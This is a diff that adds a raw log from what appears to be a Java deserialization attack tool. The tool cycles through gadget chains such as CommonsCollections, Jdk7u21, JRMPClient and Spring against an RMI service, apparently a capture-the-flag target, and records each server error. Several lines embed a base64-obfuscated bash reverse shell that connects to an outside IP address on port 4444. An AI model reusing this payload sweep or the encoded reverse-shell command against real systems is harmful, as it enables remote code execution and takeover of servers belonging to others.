@@ -1,0 +1,40 @@
+[*] Potential payload: FileUpload1
+java.lang.IllegalArgumentException: Unsupported command bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuOTIuMjguMTg3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i} [bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuOTIuMjguMTg3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}]
+[*] Potential payload: C3P0
+java.lang.IllegalArgumentException: Command format is: <base_url>:<classname>
+[*] Potential payload: CommonsCollections1
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
+	java.io.InvalidClassException: org.apache.commons.collections.functors.InvokerTransformer; local class incompatible: stream classdesc serialVersionUID = -8653385846894047688, local class serialVersionUID = -1333713373713373737
+[*] Potential payload: CommonsCollections3
+java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
+[*] Potential payload: CommonsCollections5
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
+	java.io.InvalidClassException: org.apache.commons.collections.functors.InvokerTransformer; local class incompatible: stream classdesc serialVersionUID = -8653385846894047688, local class serialVersionUID = -1333713373713373737
+[*] Potential payload: CommonsCollections6
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
+	java.io.InvalidClassException: org.apache.commons.collections.functors.InvokerTransformer; local class incompatible: stream classdesc serialVersionUID = -8653385846894047688, local class serialVersionUID = -1333713373713373737
+[*] Potential payload: Groovy1
+java.lang.NullPointerException
+[*] Potential payload: Jdk7u21
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
+	java.io.InvalidObjectException: Non-annotation type in annotation serial stream
+[*] Potential payload: JRMPClient
+java.lang.ClassCastException: com.sun.proxy.$Proxy1 cannot be cast to rmi.Player
+[*] Potential payload: JRMPListener
+java.lang.NumberFormatException: For input string: "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuOTIuMjguMTg3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
+[*] Potential payload: Jython1
+java.lang.IllegalArgumentException: Unsupported command bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuOTIuMjguMTg3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i} [bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuOTIuMjguMTg3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}]
+[*] Potential payload: Myfaces1
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is: 
+	java.io.StreamCorruptedException: invalid type code: 00
+[*] Potential payload: Myfaces2
+java.lang.IllegalArgumentException: Command format is: <base_url>:<classname>
+[*] Potential payload: Spring1
+java.lang.NullPointerException
+[*] Potential payload: Spring2
+java.lang.NullPointerException
